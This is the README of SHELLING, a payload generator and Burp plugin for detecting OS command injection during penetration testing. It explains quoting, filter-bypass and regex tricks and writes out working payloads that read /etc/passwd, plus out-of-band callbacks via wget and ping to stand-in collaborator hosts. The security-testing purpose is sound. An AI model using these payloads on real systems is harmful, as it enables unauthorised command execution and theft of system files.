Original work by: Julian H. https://github.com/ewilded/shelling

# SHELLING - a comprehensive OS command injection payload generator - now also available as a Burp Plugin
![Logo](logo.png?raw=true "Logo")
## What is SHELLING?
This script is a customizable payload generator intended for detecting OS command injection flaws during dynamic testing, usually conducted with no access to the source code or the filesystem.  Creation of SUCCESSFUL payloads in this kind of assessments requires a lot of guesswork, especially:
- the eventual syntax of the expression we are injecting into (e.g. quoted expressions)
- input sanitizing mechanisms rejecting individual characters (e.g. spaces)
- platform-specific conditions (e.g. there is no "sleep" on windows)
- callback method (e.g. asynchronous execution, no outbound traffic allowed)

The purpose of creating this tool was to reach the non-trivial OS command injection cases, which stay undetected by generally known and used tools and sets of payloads. 


### The syntax problem

Let's consider the following vulnerable PHP script:

    <?php
    if(isset($_GET['username'])) echo shell_exec("echo '{$_GET['username']}'>>/tmp/users.txt");
    ?>


What makes this case different from the most common and obvious cases of OS command injection is the fact that the user-controlled variable is injected between single quotes in the final expression passed to the shell_exec function. Hence, one of the most obvious OS command injection test cases, like
`http://localhost/vuln.php?username=;cat /etc/passwd;` would result in the expression being evaluated to echo `';cat /etc/passwd;'`. 
So, instead of executing the command, the entire user input is written into the /tmp/users.txt file.

This particular payload leads to a false negative in this particular case, as it does not fit the target expression syntax in a way that would make shell_exec function treat it as a system command. Instead, the payload is still treated as an argument to the echo command.
In order to properly inject into this particular command, we need to jump out from the quoted expression in the first place. If we simply try payload like `';cat
/etc/passwd;`, the expression would evaluate to echo `'';cat /etc/passwd;'`, we would still get a false negative due to unmatched quoted string following the command we injected.

A payload fitting to this particular syntax should look like `';cat /etc/passwd;'`:
`http://localhost/vuln.php?username=%27;cat /etc/passwd;%27`, making the final expression to look like echo `'';cat /etc/passwd;''`.

And the output is (the injection is working):

    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin: [...]

This is just one of the examples of how the syntax of the target injectable expression affects the results. The solution to this problem is a good list of vulnerable syntax-varied cases, as we have to guess as many syntax-dependant cases as possible.
For the rest of this write-up, let’s use the following legend:

- OS_COMMAND = the name of the remote binary we want to execute, e.g. `ping`
- ARGUMENT = the argument of the command we want to execute, e.g.`collaborator.example.org`
- ARGUMENT_SEPARATOR = string between the OS_COMMAND and the ARGUMENT 
- FULL_COMMAND=`OS_COMMAND+ARGUMENT_SEPARATOR+ARGUMENT`
- COMMAND_SEPARATOR = a string that separates multiple commands from each other, required for successful injection in many cases 
- COMMAND_TERMINATOR = a sequence which, if injected into a string, enforces the remote system to ignore the remainder of that string (everything that follows the terminator)

So, I came up with the following list of syntax patterns was created:
- `FULL_COMMAND` - when command is directly injected into an expression
- `FULL_COMMAND+(COMMAND_TERMINATOR or COMMAND_TERMINATOR)` - when the command is directly injected into the beginning of the expression and then it is appended with some arguments/other commands
- `COMMAND_SEPARATOR + FULL_COMMAND` - when command is appended as an argument of a command hardcoded in the expression
- `COMMAND_SEPARATOR + FULL_COMMAND + COMMAND_SEPARATOR` - when the command is appended as an argument to a command hardcoded in the expression AND appended with some arguments/other commands

Additionally, all the above combinations need corresponding versions targeted at quoted expressions.
Single quotes:
- `'FULL_COMMAND'`
- `'FULL_COMMAND+(COMMAND_TERMINATOR or COMMAND_TERMINATOR)'`
- `'COMMAND_SEPARATOR + FULL_COMMAND'`
- `'COMMAND_SEPARATOR+ FULL_COMMAND + COMMAND_SEPARATOR'`

Double quotes:
- `“FULL_COMMAND”`
- `“FULL_COMMAND+(COMMAND_TERMINATOR or COMMAND_TERMINATOR)”`
- `“COMMAND_SEPARATOR+ FULL_COMMAND”`
- `“COMMAND_SEPARATOR+ FULL_COMMAND +COMMAND_SEPARATOR”`


### The problem of input-sanitizing mechanisms

#### Bad characters
As it is generally known, blacklisting is not a good approach in security. In most cases, sooner or later the attackers find a way around it.
Many input-sanitizing functions attempt to catch all potentially dangerous characters which might give an attacker a way to control the target expression.

Let's consider the following example:

    <?php
    if(isset($_POST['dir'])&&!preg_match('/\s+/',$_POST['dir']))
    {
    echo "Dir contents are:\n<br />".shell_exec("ls {$_POST['dir']}");
    }
    ?>


The script executes the OS command only if the user-supplied variable does not contain any white characters (like spaces or tabs). This is why payloads like:
`cat /etc/passwd`
`;cat /etc/passwd;`
`';cat /etc/passwd;'`

lead to false negatives.

In order to execute an arbitrary command, we need an alternative expression to separate the command from its argument (we need an alternative ARGUMENT_SEPARATOR). 

A way to achieve this is an expression like `$IFS$9`, so the alternative payloads would be:
`cat$IFS$9/etc/passwd`
`;cat$IFS$9/etc/passwd;`
`';cat$IFS$9/etc/passwd;'`

In the unix environment, the `$IFS` environmental variable contains the current argument separator value (which is space by default), while `$9` is just a holder of the ninth argument of the current system shell process, which is always an empty string, but is required to avoid the system shell confusing the `$IFSsomething` syntax with a non-existent environmental variable called `IFSsomething`.

Currently supported alternative argument separators are for unix are:
- `%20` - space
- `%09` - horizontal tab
- `$IFS$9` - IFS terminated with 9-nth - usually empty - argument holder)
- `{OS_COMMAND,ARGUMENT}` - the brace expression

The above is just an example of bypassing poorly written input-sanitizing function from the perspective of alternative argument separators. 

Other options include filters on command separators (not to confuse with argument separators), which are in most cases required to inject arbitrary commands. The list of tested command separators:

- `%0a` (new line characters)
- `%0d` (carriage return characters)
- `;`
- `&`
- `|`

Additionally, the following command terminators are used (in case input was written into a file or a database before execution and our goal was to get rid of everything appended to our payload in order to avoid syntax issues):
- `%00` (nullbyte)
- `%F0%9F%92%A9` (Unicode poo character, known to cause string termination in db software like MySQL)
- `%20#` - space followed by a hash sign

This way the base payload set is multiplied by all the feasible combinations of alternative argument separators, command separators and command terminators.

Some of the above separators include double characters (like two spaces or two tabs, one after another). This is an optimisation aimed at defeating improperly written filters which only cut out single instances of banned characters, instead of removing them all. In such case two characters would get reduced to one, bypassing the filter and hitting the vulnerable function.

#### Regular expressions

Some input sanitizers are based on regular expressions, checking if the user-supplied input does match the correct pattern (the good, whitelist approach, as opposed to a blacklist).
Still, a good approach can be improperly implemented, creating loopholes. A few examples below.

The following vulnerable PHP will refuse to execute any OS commands as long as the user-supplied input does not START with alphanumeric character/characters:

    <?php
    if(isset($_GET['dir'])&&preg_match('/\w+$/',$_GET['dir']))
    {
    echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
    }
    ?>

This is why all of the previously discussed payloads would end up in false negatives. An example payload defeating this filter could be `foo;cat /etc/passwd`.

Another example's regular expression requires the user-supplied value to both start and end with alphanumeric characters:

    <?php
    if(isset($_GET['dir'])&&preg_match('/^\w+\..*\w+\.\w+$/',$_GET['dir']))
    {
    echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
    }
    ?>

Due to the fact that it contains a lax the `.*` part in the middle, it is possible to defeat it with a payload starting and ending with an alphanumeric string, like `foo1.co.uk;cat /etc/passwd;foo2.co.uk`. In this case it does not matter that there is no such file as `foo1.co.uk` and that there is no such command as `foo2.co.uk`, what matters is that the command between these prefixes will execute properly. 
These two examples show that all the previously mentioned payloads also require alternatives with proper prefixes and/or suffixes. The most universal and safe choices are numbers and lowercase words, but it is also required to extend this choice according to the legitimate input the application is expecting. For example, if the feature being tested is an online ping tool, the most obvious value for prefix/suffix value is a valid IP address/domain name.
This makes us extend our base payload set to combinations like:
- `COMMAND_SEPARATOR+FULL_COMMAND+COMMAND_SEPARATOR+SUFFIX`
- `PREFIX+COMMAND_SEPARATOR+ FULL_COMMAND+COMMAND_SEPARATOR`
- `PREFIX+COMMAND_SEPARATOR+ FULL_COMMAND+COMMAND_SEPARATOR+SUFFIX`
- `PREFIX+FULL_COMMAND+SUFFIX`


### The problem of platform-specific conditions

Depending on the technology we are dealing with, some payloads working on some systems will fail on other. The examples include:
- using windows-specific command on a nix-like system
- using nix-like specific argument separator on a windows system
- dealing with a different underlying system shell (e.g. `cat /etc/passwd #'` will work on bash/ash/dash, but won't work on csh)
- different filesystem PATH values

With this in mind, the best (and currently applied) approach is to use commands and syntaxes that work the same on all tested platforms (the most basic syntax of commands like echo and ping remains the same across nix/win). If this approach turns out not to be exhaustive, alternative base payloads need to be added to the test set.


### The problem of the feedback channel

All the above vulnerable scripts have two common features:
- they are synchronous, meaning that the script does not return any output as long as the command has not returned results, so it is synchronous with
our targeted function 
- they all return the target function's output, meaning that we could actually see the results of the issued commands on the web page.

This conditions are often untrue, especially the second one. So, let's deal with a script like:

    <?php
    if(isset($_GET['username']))
    {
    $out=@shell_exec("ls /home/{$_GET['username']}");
    file_put_contents('/var/www/user.lookups.txt',$out,FILE_APPEND);
    }
    ?>

The above script is synchronous, but does not return output. An alternative that would also be asynchronous would involve saving the command in some file/database entry and having it executed by another process within unknown time (e.g. a scheduled task). 
So, using all the variations of test commands like cat /etc/passwd or echo test would lead to false negatives, because the output is never returned to the browser.
This is why we need alternative feedback channels, also known as out of band channels. 
These can include stuff like:
- response time (e.g. commands like sleep 30 will case noticeable delay, confirming that the injection was successful, however this does only apply to synchronous scripts)
- network traffic, like reverse HTTP connections (wget http://a.collaborator.example.org), ICMP ping requests or/and DNS lookups (ping sub.a.collaborator.example.org)

In order to avoid false negatives, when no command output is returned by the application, it is necessary to employ out-of-band channel payloads in the test set. All of the above might fail, as in the worst case we might be dealing with an asynchronous command injection that returns no output and runs on a server not being able to send out traffic HTTP/DNS/ICMP to arbitrary locations. 
In such case, the only way (without involving third parties) to confirm that the injected command has executed, would be an injection of some sort of payload causing a Denial of
Service condition (obviously not recommended if testing production systems :)).

#### Feedback channel - if all the above fails 
If neither direct output, time delay nor network traffic indicated a successful command injection, we can perform one more test to be entirely sure. In this
case we need cooperation from the application owner/custodian, as file system access is required to perform this verification step. 
All we need is another set of payloads, this time with the `OS_COMMAND` set to touch and the `ARGUMENT` set to `/tmp/foo`. After attempting to create a file with the entire payload set, we examine the filesystem to check if a file named /tmp/foo has been created.

### Features and usage

The following basic configuration options are available:
- `$COMMAND` - the name of the system binary to run, the default is `'ping'` (could be changed to echo, touch, wget - basically it depends on our preferred feedback channel)
- `$TARGET_OS` - the target operating system, possible values are `'win'`, `'nix'`, `'all'` (`'all'` is the default)
- `@PREFIXES` - a list of optional prefixes and suffixes used to trick some regular expressions (this depends on the type of input our target function is taking, e.g. a username, an IP address or a domain name) - the default is 'aa'
- `$ARGUMENT` - the argument for the command, depending on the feedback channel we want to utilize. The default is `'PAYLOAD_MARK.sub.evilcollab.org'`.
- `$payload_marking` - whether or not to use the payload marking (see below) - the default is '1' (yes).

The `PAYLOAD_MARK` holder is either removed - or replaced with a unique payload identifier (a natural number), so it is possible to track the correct payload if the attack was successful. A few examples:

- `$COMMAND='ping'`, `$ARGUMENT='PAYLOAD_MARK.sub.evilcollab.org'` - this will generate commands like `ping$IFS$966.sub.evilcollab.org`. So, if this particular payload is successful, the nameserver responsible for serving the `*.sub.evilcollab.org` entries will receive a query to `66.sub.evilcollab.org` - so we know that the 66-th payload defeated the sanitizer.
- `$COMMAND='touch'`, `$ARGUMENT='/tmp/fooPAYLOAD_MARK'` - this will generate commands like `touch$IFS$9/tmp/foo132` - so if a file /tmp/foo132 is created, we know that the 132-th payload did the trick.

The tool can be used for detection directly - or in a hybrid approach, after identifying suspicious behaviours with Backslash Powered Scanner Burp Plugin.

### The Burp Plugin

It is recommended to use the Burp plugin along with the Burp Collaborator Client (to take advantage of the DNS feedback channel and payload marking):

![Demo Screenshot](plugin.png?raw=true "The Burp Plugin")

![Demo Screenshot](plugin2.png?raw=true "The Burp Plugin")


### Case examples
#### 1) See the test_cases directory 
#### 2) Some real examples
- https://chris-young.net/2017/04/12/pentest-ltd-ctf-securi-tay-2017-walkthrough/
- https://www.exploit-db.com/exploits/41892/


